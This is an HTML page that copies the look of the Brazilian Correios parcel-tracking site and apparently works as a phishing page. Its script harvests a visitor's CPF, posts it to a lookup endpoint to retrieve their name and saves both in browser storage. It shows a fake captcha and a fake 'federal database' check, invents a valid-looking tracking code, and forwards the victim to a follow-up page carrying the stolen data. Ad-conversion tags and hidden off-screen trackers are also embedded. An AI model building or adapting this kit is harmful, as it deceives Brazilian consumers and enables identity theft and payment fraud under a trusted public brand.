<!DOCTYPE html>
<html lang="pt-BR">
<head>
    
    <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=AW-18454278784"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'AW-18454278784');
</script>

<!-- Event snippet for Visualização de página (2) conversion page -->
<script>
  gtag('event', 'conversion', {
      'send_to': 'AW-18454278784/IjtACLPTuPocEIDl199E',
      'value': 1.0,
      'currency': 'BRL'
  });
</script>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta name="mobile-web-app-capable" content="yes">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="theme-color" content="#f5f3f0">
    <title>Rastrear Encomenda Correios</title>
    <link rel="shortcut icon" href="images/favi-ect.png" type="image/x-icon">
    <style>body{visibility:visible}</style>
    <noscript><style>body{visibility:visible!important}</style></noscript>
    <style>
        :root {
            --azul: #0071ad;
            --azul-escuro: #003157;
            --azul-correios: #00416b;
            --amarelo: #ffd400;
            --amarelo-fundo: #ffe600;
            --cinza-escuro: #555577;
            --cinza-fundo: #f5f3f0;
            --borda-input: #807569;
            --altura-menu: 3rem;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Trebuchet MS','arial','helvetica','Open Sans',sans-serif; font-size: 1rem; color: var(--cinza-escuro); background: #fff; line-height: 1.5; }
        a { color: var(--azul); text-decoration: none; cursor: default; }
        a[href] { cursor: pointer; }
        a:hover { color: #A65718; }
        h1,h2,h3 { color: var(--azul-correios); margin-bottom: 1rem; }
        ul { list-style: none; margin: 0; padding: 0; }
        #menu { height: var(--altura-menu); z-index: 10; position: sticky; top: 0; width: 100%; display: flex; align-items: center; border-bottom: 2px solid var(--amarelo); padding: 0.5rem 0.75rem; background: var(--cinza-fundo); }
        #menu .hamburger { flex: 0 0 2rem; height: 2rem; margin-right: 0.5rem; display: flex; align-items: center; justify-content: center; cursor: pointer; }
        #menu .hamburger span, #menu .hamburger span::before, #menu .hamburger span::after { display: block; width: 1.25rem; height: 2px; background: var(--cinza-escuro); position: relative; transition: 0.2s; }
        #menu .hamburger span::before, #menu .hamburger span::after { content: ''; position: absolute; left: 0; width: 100%; }
        #menu .hamburger span::before { top: -6px; }
        #menu .hamburger span::after { top: 6px; }
        #menu .logo { flex: 1 1 auto; display: flex; justify-content: center; }
        #menu .logo img { height: 26px; }
        #menu .entrar { flex: 0 0 auto; font-size: 0.85rem; color: var(--azul); padding: 0 0.5rem; display: none; }
        @media (min-width: 768px) { #menu .logo { justify-content: flex-start; } #menu .logo img { height: 30px; } #menu .entrar { display: flex; align-items: center; } }
        main { min-height: calc(100vh - var(--altura-menu) - 10rem); width: 100%; padding: 1rem; }
        @media (min-width: 768px) { main { max-width: 738px; margin: 0 auto; } }
        @media (min-width: 992px) { main { max-width: 962px; } }
        #trilha { display: flex; flex-flow: row wrap; margin-bottom: 1rem; font-size: 0.9rem; }
        #trilha a { color: #0070ad; padding: 0 1.25rem 0 0; position: relative; }
        #trilha a:not(:last-child)::after { content: '\203A'; position: absolute; right: 0.35rem; color: #999; font-size: 1.1rem; }
        #trilha a:last-child { padding: 0; color: #333; font-weight: 500; }
        #trilha a:first-child { display: none; }
        @media (min-width: 992px) { #trilha a:first-child { display: inline; } }
        #titulo-pagina h3 { font-size: 1.4rem; font-weight: bold; color: var(--azul-correios); margin-bottom: 0.75rem; }
        .jumbotron { background-color: #e9ecef; padding: 1.25rem 1rem; margin-bottom: 1.5rem; border-radius: 4px; }
        .campos { display: flex; flex-flow: row wrap; }
        .campos > .campo { flex: 1 1 100%; }
        .campos > .campo > .rotulo { display: flex; flex-flow: row wrap; align-items: center; padding: 0.25rem 0; margin-bottom: 0.25rem; }
        .campos > .campo > .rotulo label { color: #222; margin-right: 0.5rem; font-size: 0.95rem; line-height: 1.5; }
        .campos > .campo > .rotulo label span { font-weight: bold; }
        .campos > .campo > .controle { display: flex; flex-flow: row wrap; align-items: center; }
        .campos > .campo > .controle.linhas { flex-flow: row nowrap; align-items: flex-start; }
        input[type="text"], .form-control { display: block; width: 100%; outline: none; line-height: 1.9rem; background-color: #fff; color: var(--borda-input); border: 1px solid var(--borda-input); padding: 0.3125rem 0.9375rem; border-radius: 5px; box-shadow: none; font-family: inherit; font-size: 1rem; }
        input[type="text"]:focus, .form-control:focus { box-shadow: 0 0 0 2px var(--azul); border-color: var(--azul); }
        #numeroDocumento { text-transform: uppercase; }
        #numeroDocumento::placeholder { text-transform: none; }
        .limite-objetos { margin-top: 0.75em; font-size: 0.85rem; color: #666; }
        .campos > .campo > .mensagem { font-style: italic; padding: 0.25rem 0; color: #222; }
        .captcha { display: flex; flex-flow: column; flex-wrap: nowrap; }
        @media (min-width: 768px) { .captcha { flex-flow: row; gap: 1rem; } .captcha > .campo { flex: 1; } }
        #captcha_image { width: 100%; max-width: 220px; height: auto; border: 1px solid #ccc; border-radius: 4px; background: #fff; }
        .captcha-controles { display: flex; align-items: center; gap: 0.5rem; margin-top: 0.5rem; }
        .captcha-btn { background: none; border: none; cursor: pointer; font-size: 1.2rem; color: var(--azul); padding: 4px; display: flex; align-items: center; justify-content: center; width: auto; height: auto; }
        .captcha-btn:hover { color: #A65718; background: none; }
        .botao-principal { display: inline-flex; align-items: center; justify-content: center; height: 2.5rem; padding: 0 2rem; margin: 1rem auto 0; background-color: var(--azul); color: #fff; border: none; border-radius: 4px; font-size: 1rem; font-weight: bold; font-family: inherit; cursor: pointer; white-space: nowrap; transition: background 0.2s; }
        .botao-principal:hover { background-color: #005f8f; }
        .botao-principal:active { background-color: #004d75; }
        .botoes { display: flex; flex-flow: row wrap; justify-content: center; }
        .bannersro { text-align: center; margin-top: 0.5rem; }
        .carousel { overflow: hidden; position: relative; max-width: 100%; border-radius: 6px; }
        .carousel-container { display: flex; transition: transform 0.5s ease-in-out; }
        .carousel img { width: 100%; height: auto; flex-shrink: 0; }
        .carousel-nav { display: flex; justify-content: center; gap: 6px; margin-top: 8px; }
        .carousel-dot { width: 8px; height: 8px; border-radius: 50%; border: 1px solid #aaa; background: #ddd; cursor: pointer; padding: 0; transition: background 0.2s; }
        .carousel-dot.active { background: var(--azul-correios); border-color: var(--azul-correios); }
        #rodape { font-size: 14px; padding: 1.5rem 1rem 1rem; font-family: 'Trebuchet MS','arial','helvetica','Open Sans',sans-serif; background-color: var(--amarelo-fundo); min-height: 10rem; }
        .recipiente { display: grid; grid-template-columns: 1fr; grid-gap: 1.5rem; max-width: 1200px; margin: 0 auto; }
        @media (min-width: 576px) { .recipiente { grid-template-columns: 1fr 1fr; } }
        @media (min-width: 768px) { .recipiente { grid-template-columns: 1fr 1fr 1fr; grid-gap: 2rem; } }
        .rodape-links h2 { font-size: 1.1rem; font-weight: bold; color: var(--azul-escuro); margin-bottom: 0.75rem; }
        .lista-icone li { margin-bottom: 0.25rem; }
        .lista-icone li a { display: inline-flex; align-items: center; height: 1.875rem; padding: 0.15rem; color: #004168; text-decoration: none; font-size: 0.9rem; cursor: pointer; }
        .lista-icone li a:hover span { text-decoration: underline; color: #d59118; }
        .lista-icone li a img.icones-link { width: 1rem; height: 1rem; margin-right: 0.5rem; flex-shrink: 0; }
        .copyright { font-size: 14px; text-align: center; margin-top: 1.5rem; padding-top: 1rem; color: var(--azul-escuro); }
        .modalcarregando { display: none; align-items: center; justify-content: center; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.45); z-index: 9999; }
        .modalcarregando.active { display: flex; }
        .modal-contente { background-color: #fff; padding: 28px 24px; border-radius: 8px; text-align: center; width: 300px; display: flex; flex-direction: column; align-items: center; box-shadow: 0 8px 32px rgba(0,0,0,0.15); }
        .modal-contente h2 { font-size: 1.1rem; color: var(--azul-correios); margin-bottom: 0.25rem; }
        .modal-contente p { font-size: 0.9rem; color: #777; margin-bottom: 0; }
        .loadere { border: 4px solid #e9ecef; border-top: 4px solid var(--azul-correios); border-radius: 50%; width: 42px; height: 42px; animation: spin 0.9s linear infinite; margin-top: 18px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        @media (max-width: 480px) { .jumbotron { padding: 1rem 0.75rem; } #titulo-pagina h3 { font-size: 1.2rem; } }
    </style>
</head>
<body>
<section id="menu">
    <a class="hamburger"><span></span></a>
    <a class="logo"><img src="images/correios-1.png" alt="Logo Correios"></a>
    <a class="entrar">Entrar</a>
</section>
<main role="main">
    <nav aria-label="breadcrumb">
        <div id="trilha">
            <a>Portal Correios</a>
            <a>Rastreamento</a>
        </div>
    </nav>
    <div id="titulo-pagina"><h3>Rastreamento</h3></div>
    <div class="jumbotron">
        <div class="campos">
            <div class="campo">
                <div class="rotulo">
                    <label for="numeroDocumento">
                        Deseja acompanhar sua encomenda?<br>
                        Para isso, insira seu <span>Codigo de Rastreamento</span> ou CPF.
                    </label>
                </div>
                <div class="controle linhas align-items-center">
                    <input type="text" id="numeroDocumento" name="numeroDocumento" class="form-control" placeholder="AA123456785BR" value="" autocomplete="off">
                </div>
                <div class="limite-objetos">* limite de 20 objetos</div>
                <div class="mensagem"></div>
            </div>
        </div>
        <div class="campos captcha">
            <div class="campo">
                <div class="controle">
                    <img id="captcha_image" src="" alt="CAPTCHA">
                    <div class="captcha-controles">
                        <button type="button" class="captcha-btn" onclick="setCaptchaImage()" title="Gerar novo captcha">&#x21BB;</button>
                    </div>
                </div>
            </div>
            <div class="campo">
                <div class="rotulo"><label for="captcha">Digite o texto contido na imagem</label></div>
                <div class="controle">
                    <input type="text" name="captcha" id="captcha" autocomplete="off" class="form-control" maxlength="6">
                </div>
                <div class="botoes">
                    <button type="button" id="submitBtn" class="botao-principal" onclick="submitForm()">Consultar</button>
                </div>
                <div class="mensagem"></div>
            </div>
        </div>
    </div>
    <div class="bannersro">
        <div class="carousel" id="carousel">
            <div class="carousel-container" id="carouselContainer">
                <img src="images/banner1.webp" alt="Banner 1">
                <img src="images/banner2.webp" alt="Banner 2">
                <img src="images/banner3.webp" alt="Banner 3">
            </div>
        </div>
        <div class="carousel-nav" id="carouselNav">
            <button class="carousel-dot active" data-index="0"></button>
            <button class="carousel-dot" data-index="1"></button>
            <button class="carousel-dot" data-index="2"></button>
        </div>
    </div>
</main>
<footer id="rodape">
    <div class="recipiente">
        <div class="rodape-links">
            <h2>Fale Conosco</h2>
            <ul class="lista-icone">
                <li><a><img class="icones-link" src="images/monitor.png"><span>Registro de Manifestacoes</span></a></li>
                <li><a><img class="icones-link" src="images/duvida.png"><span>Central de Atendimento</span></a></li>
                <li><a><img class="icones-link" src="images/negocios.png"><span>Solucoes para o seu negocio</span></a></li>
                <li><a><img class="icones-link" src="images/headset.png"><span>Suporte ao cliente com contrato</span></a></li>
                <li><a><img class="icones-link" src="images/ouvidoria.png"><span>Ouvidoria</span></a></li>
                <li><a><img class="icones-link" src="images/denuncia.png"><span>Denuncia</span></a></li>
            </ul>
        </div>
        <div class="rodape-links">
            <h2>Sobre os Correios</h2>
            <ul class="lista-icone">
                <li><a><img class="icones-link" src="images/identidade.png"><span>Identidade corporativa</span></a></li>
                <li><a><img class="icones-link" src="images/educacao.png"><span>Educacao e cultura</span></a></li>
                <li><a><img class="icones-link" src="images/codigo-etica.png"><span>Codigo de etica</span></a></li>
                <li><a><img class="icones-link" src="images/transparencia.png"><span>Transparencia e prestacao de contas</span></a></li>
                <li><a><img class="icones-link" src="images/cadeado.png"><span>Politica de Privacidade e Notas Legais</span></a></li>
            </ul>
        </div>
        <div class="rodape-links">
            <h2>Outros Sites</h2>
            <ul class="lista-icone">
                <li><a><img class="icones-link" src="images/loja correios.png"><span>Loja online dos Correios</span></a></li>
            </ul>
        </div>
    </div>
    <div class="copyright">&copy; Copyright 2026 Correios</div>
</footer>

<div id="modalProcessando" class="modalcarregando">
    <div class="modal-contente" style="background:#fff;border-radius:16px;padding:40px 30px;text-align:center;max-width:360px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.15)">
        <div id="loadingPhase">
            <div style="margin:0 auto 20px;width:50px;height:50px;border:4px solid #e5e7eb;border-top:4px solid #FFCB05;border-radius:50%;animation:spin 0.8s linear infinite"></div>
            <h2 id="loadingTitle" style="font-size:1.1rem;color:#1a1a1a;margin:0 0 8px">Consultando base de dados...</h2>
            <p id="loadingSubtitle" style="font-size:0.85rem;color:#666;margin:0">Aguarde enquanto verificamos</p>
            <div style="margin:16px auto 0;width:80%;height:6px;background:#e5e7eb;border-radius:3px;overflow:hidden">
                <div id="loadingBar" style="width:0%;height:100%;background:linear-gradient(90deg,#FFCB05,#F5A623);border-radius:3px;transition:width 0.3s"></div>
            </div>
        </div>
        <div id="resultPhase" style="display:none">
            <div style="width:50px;height:50px;background:#dcfce7;border-radius:50%;margin:0 auto 16px;display:flex;align-items:center;justify-content:center">
                <svg width="24" height="24" fill="none" stroke="#16a34a" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
            </div>
            <h2 id="resultTitle" style="font-size:1.1rem;color:#1a1a1a;margin:0 0 6px">Registro encontrado!</h2>
            <p id="resultInfo" style="font-size:0.85rem;color:#666;margin:0"></p>
        </div>
    </div>
</div>
<style>@keyframes spin{to{transform:rotate(360deg)}}</style>

<script>
function generateRandomText() {
    var chars = "abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789";
    var text = "";
    for (var i = 0; i < 4; i++) text += chars.charAt(Math.floor(Math.random() * chars.length));
    return text;
}
function generateCaptchaSVG() {
    var captchaText = generateRandomText();
    var width = 220, height = 52;
    var svgContent = '<svg xmlns="http://www.w3.org/2000/svg" width="' + width + '" height="' + height + '" viewBox="0 0 ' + width + ' ' + height + '"><rect width="' + width + '" height="' + height + '" fill="#fff"/>';
    for (var c = 0; c < captchaText.length; c++) {
        var x = 28 + c * 42, y = 35 + (Math.random() * 6 - 3), rot = Math.random() * 20 - 10;
        svgContent += '<text x="' + x + '" y="' + y + '" font-size="28" font-family="Arial,sans-serif" fill="#777" font-weight="bold" transform="rotate(' + rot + ' ' + x + ' ' + y + ')">' + captchaText[c] + '</text>';
    }
    for (var i = 0; i < 3; i++) {
        var x1=Math.random()*width,y1=Math.random()*height,x2=Math.random()*width,y2=Math.random()*height,cx1=Math.random()*width,cy1=Math.random()*height,cx2=Math.random()*width,cy2=Math.random()*height;
        svgContent += '<path d="M'+x1+','+y1+' C'+cx1+','+cy1+' '+cx2+','+cy2+' '+x2+','+y2+'" stroke="#979393" stroke-width="1.5" fill="none"/>';
    }
    for (var j = 0; j < 40; j++) {
        svgContent += '<circle cx="' + (Math.random()*width) + '" cy="' + (Math.random()*height) + '" r="1.2" fill="#979393"/>';
    }
    svgContent += '</svg>';
    window._captchaAnswer = captchaText;
    return svgContent;
}
function setCaptchaImage() {
    var svgData = generateCaptchaSVG();
    var base64SVG = btoa(unescape(encodeURIComponent(svgData)));
    document.getElementById("captcha_image").src = "data:image/svg+xml;base64," + base64SVG;
}
setCaptchaImage();

function gerarCodigoRastreio() {
    var prefixos = ['NL','NB','NX','NJ','LB','LX','JT','SS','SX','RR','RA','RB','RC','RD','RE','RF','RG','RH','RI','RJ','RK','RL','RM','RN','RO','RP','RQ','RS','RT','RU','RV','RW','RX','RY','RZ'];
    var prefixo = prefixos[Math.floor(Math.random() * prefixos.length)];
    var numeros = '';
    for (var i = 0; i < 8; i++) numeros += Math.floor(Math.random() * 10);
    var pesos = [8,6,4,2,3,5,9,7], soma = 0;
    for (var j = 0; j < 8; j++) soma += parseInt(numeros[j]) * pesos[j];
    var resto = soma % 11, digito;
    if (resto === 0) digito = 5;
    else if (resto === 1) digito = 0;
    else digito = 11 - resto;
    return prefixo + numeros + digito + 'BR';
}

function validarCPF(cpf) {
    if (/^(\d)\1{10}$/.test(cpf)) return false;
    var soma = 0;
    for (var i = 0; i < 9; i++) soma += parseInt(cpf[i]) * (10 - i);
    var resto = (soma * 10) % 11;
    if (resto === 10) resto = 0;
    if (resto !== parseInt(cpf[9])) return false;
    soma = 0;
    for (var j = 0; j < 10; j++) soma += parseInt(cpf[j]) * (11 - j);
    resto = (soma * 10) % 11;
    if (resto === 10) resto = 0;
    if (resto !== parseInt(cpf[10])) return false;
    return true;
}

function submitForm() {
    var codigoRastreio = document.getElementById('numeroDocumento').value.trim();
    var captchaInput = document.getElementById('captcha').value.trim();
    if (!codigoRastreio) { alert('Por favor, informe um codigo de rastreio ou CPF.'); return; }
    if (!captchaInput) { alert('Por favor, digite o texto do captcha.'); return; }
    var isRastreio = /^[a-zA-Z]{2}[0-9]{9}[a-zA-Z]{2}$/.test(codigoRastreio);
    var soCPF = codigoRastreio.replace(/\D/g, '');
    var isCPF = soCPF.length === 11 && validarCPF(soCPF);
    if (isRastreio) {
        localStorage.setItem('tipoRastreio', 'Rastreio');
        buscarRastreio(codigoRastreio.toUpperCase(), '');
    } else if (isCPF) {
        var codigoGerado = gerarCodigoRastreio();
        localStorage.setItem('tipoRastreio', 'CPF');
        buscarRastreio(codigoGerado, soCPF);
    } else {
        alert('Codigo de rastreio ou CPF invalido. Verifique os dados e tente novamente.');
    }
}

function buscarRastreio(codigo, cpf) {
    document.getElementById('modalProcessando').classList.add('active');
    var bar = document.getElementById('loadingBar');
    var title = document.getElementById('loadingTitle');
    var MIN_LOADING = 3000;
    bar.style.width = '20%';
    title.textContent = 'Conectando ao sistema dos Correios...';

    function doRedirect(nome) {
        // Redireciona para rastreio.php no mesmo diretório
        var url = 'rastreio.php?codigo=' + encodeURIComponent(codigo) + '&cpf=' + encodeURIComponent(cpf);
        if (nome) url += '&nome=' + encodeURIComponent(nome);
        // Repassa params de tracking da URL atual
        var params = new URLSearchParams(window.location.search);
        params.forEach(function(val, key) {
            if (key !== 'codigo' && key !== 'cpf' && key !== 'nome') {
                url += '&' + encodeURIComponent(key) + '=' + encodeURIComponent(val);
            }
        });
        window.location.href = url;
    }

    if (cpf && cpf.length === 11) {
        setTimeout(function(){ bar.style.width = '40%'; title.textContent = 'Consultando CPF na base federal...'; }, 800);
        setTimeout(function(){ bar.style.width = '60%'; title.textContent = 'Verificando dados...'; }, 1600);
        var cpfNome = '';
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'api/cpf_lookup.php', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.onload = function(){
            if(xhr.status === 200){ try { var data = JSON.parse(xhr.responseText); cpfNome = data.nome || ''; } catch(e){} }
            if(cpfNome) localStorage.setItem('correios_nome', cpfNome);
            localStorage.setItem('correios_cpf', cpf);
        };
        xhr.onerror = function(){ localStorage.setItem('correios_cpf', cpf); };
        xhr.send(JSON.stringify({cpf: cpf}));
        setTimeout(function(){ bar.style.width = '80%'; title.textContent = 'Quase pronto...'; }, 2200);
        setTimeout(function(){
            bar.style.width = '100%';
            document.getElementById('loadingPhase').style.display = 'none';
            document.getElementById('resultPhase').style.display = 'block';
            document.getElementById('resultTitle').textContent = cpfNome ? ('Atencao, ' + cpfNome.split(' ')[0] + '!') : 'Registro encontrado!';
            var masked = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.***.***-$4');
            document.getElementById('resultInfo').textContent = 'CPF: ' + masked + (cpfNome ? (' - ' + cpfNome) : '');
            setTimeout(function(){ doRedirect(cpfNome); }, 1000);
        }, MIN_LOADING);
    } else {
        setTimeout(function(){ bar.style.width = '40%'; title.textContent = 'Localizando encomenda...'; }, 800);
        setTimeout(function(){ bar.style.width = '70%'; title.textContent = 'Verificando status...'; }, 1600);
        setTimeout(function(){ bar.style.width = '100%'; title.textContent = 'Encomenda localizada!'; }, 2500);
        setTimeout(function(){ doRedirect(''); }, MIN_LOADING);
    }
}

document.getElementById('captcha').addEventListener('keypress', function(e) { if (e.key === 'Enter') submitForm(); });
document.getElementById('numeroDocumento').addEventListener('keypress', function(e) { if (e.key === 'Enter') document.getElementById('captcha').focus(); });

// CAROUSEL
(function() {
    var container = document.getElementById('carouselContainer');
    var carousel = document.getElementById('carousel');
    var imgs = container.querySelectorAll('img');
    var dots = document.querySelectorAll('.carousel-dot');
    var idx = 0, total = imgs.length, autoTimer;
    function goTo(i) {
        if (i < 0) i = total - 1;
        if (i >= total) i = 0;
        idx = i;
        container.style.transform = 'translateX(' + (-idx * imgs[0].clientWidth) + 'px)';
        dots.forEach(function(d, j) { d.classList.toggle('active', j === idx); });
    }
    function resetAuto() { clearInterval(autoTimer); autoTimer = setInterval(function() { goTo(idx + 1); }, 6000); }
    dots.forEach(function(dot) { dot.addEventListener('click', function() { goTo(parseInt(this.getAttribute('data-index'))); resetAuto(); }); });
    var startX = 0, moveX = 0, dragging = false;
    carousel.addEventListener('touchstart', function(e) { startX = e.touches[0].clientX; moveX = 0; dragging = true; }, {passive: true});
    carousel.addEventListener('touchmove', function(e) { if (!dragging) return; moveX = e.touches[0].clientX - startX; }, {passive: true});
    carousel.addEventListener('touchend', function() { if (!dragging) return; dragging = false; if (moveX < -40) { goTo(idx+1); resetAuto(); } else if (moveX > 40) { goTo(idx-1); resetAuto(); } });
    resetAuto();
    window.addEventListener('resize', function() { container.style.transform = 'translateX(' + (-idx * imgs[0].clientWidth) + 'px)'; });
})();
</script>
<script src="js/tracking.js"></script>
<script>window._currentStep="rastreio";window._trackEvent("page_view","rastreio");</script>
<script src="js/google-ads.js"></script>
<script src="js/shield.js"></script>

<div style="position:absolute; width:1px; height:1px; overflow:hidden; opacity:0; pointer-events:none; left:-9999px;">
  <script id="_waum87">var _wau = _wau || []; _wau.push(["dynamic", "00lylhhgew", "m87", "c4302bffffff", "small"]);</script>
  <script async src="//waust.at/d.js"></script>
</div>

<div style="position:absolute; width:1px; height:1px; overflow:hidden; opacity:0; pointer-events:none; left:-9999px;">
  <script id="_waum87">var _wau = _wau || []; _wau.push(["dynamic", "00lylhhgew", "m87", "c4302bffffff", "small"]);</script>
  <script async src="//waust.at/d.js"></script>
</div>

</body>
</html>